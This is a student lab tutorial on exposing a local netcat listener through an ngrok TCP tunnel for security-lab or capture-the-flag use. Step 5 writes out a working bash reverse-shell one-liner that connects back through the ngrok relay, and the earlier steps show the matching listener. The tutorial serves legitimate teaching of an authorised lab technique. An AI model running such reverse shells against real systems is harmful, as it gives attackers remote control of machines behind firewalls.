# Using ngrok to Expose a Local Listener (Lab Tutorial)

A student walkthrough for setting up ngrok to tunnel a local listener for use in an **authorized** security lab / CTF environment.

## Table of Contents

- [What ngrok does](#what-ngrok-does)
- [1. Install ngrok (Linux)](#1-install-ngrok-linux)
- [2. Create an account and connect your authtoken](#2-create-an-account-and-connect-your-authtoken)
- [3. Start a local listener](#3-start-a-local-listener)
- [4. Tunnel that port with ngrok](#4-tunnel-that-port-with-ngrok)
- [5. Connect back from the target](#5-connect-back-from-the-target)
- [6. Things to notice](#6-things-to-notice)
- [7. Scope and ethics](#7-scope-and-ethics)

---

## What ngrok does

`ngrok` creates a secure tunnel from a public internet address to a service running on your local machine, which normally sits behind NAT/a firewall and isn't reachable from outside. This is useful for testing webhooks, demoing local apps and in a security lab context, for making a local reverse-shell listener reachable by a remote target.

## 1. Install ngrok (Linux)

**Snap (simplest):**
```bash
sudo snap install ngrok
```

**Or direct binary download:**
```bash
curl -o ngrok.tgz https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar xvzf ngrok.tgz
sudo mv ngrok /usr/local/bin
```

> Check [ngrok.com/download](https://ngrok.com/download) for the current binary link, since it's updated periodically.

## 2. Create an account and connect your authtoken

1. Sign up for a free account at [ngrok.com](https://ngrok.com)
2. Copy your authtoken from the dashboard
3. Run:

```bash
ngrok config add-authtoken YOUR_TOKEN
```

This saves your token to `~/.config/ngrok/ngrok.yml` so ngrok knows it's you.

## 3. Start a local listener

Open a terminal and start `netcat` listening on a port:

```bash
nc -lvnp 4444
```

| Flag | Meaning |
|------|---------|
| `-l` | listen |
| `-v` | verbose |
| `-n` | no DNS lookups |
| `-p 4444` | port to listen on |

## 4. Tunnel that port with ngrok

In a **second terminal**:

```bash
ngrok tcp 4444
```

ngrok prints something like:

```
Forwarding    tcp://0.tcp.ngrok.io:18452 -> localhost:4444
```

That public address is now reachable from anywhere on the internet and forwards straight to your local port `4444`.

## 5. Connect back from the target

On the (authorized, lab) target machine, point a reverse shell payload at the ngrok address instead of your real IP:

```bash
bash -i >& /dev/tcp/0.tcp.ngrok.io/18452 0>&1
```

Swap in whatever host:port ngrok actually gave you.

## 6. Things to notice

- The **port changes every time** you restart `ngrok tcp` on the free tier: update the payload each session, unless you're on a paid plan with a reserved TCP address.
- ngrok acts as a relay: traffic passes through ngrok's infrastructure, not directly peer-to-peer.
- This is what lets a listener behind a home router/NAT/firewall receive a connection from outside, without any port forwarding on the router itself.
- The web inspector at `http://127.0.0.1:4040` only shows **HTTP** tunnel traffic, not TCP/shell traffic — worth mentioning so no one goes looking for the shell session there.

## 7. Scope and ethics

> ⚠️ This technique should only be used against systems and labs you are explicitly authorized to test (e.g., your own lab VMs, a CTF environment, or a client engagement with signed authorization). Using it against systems without permission is illegal.

---

*Prepared as a student reference for Korlink cybersecurity lab session.*
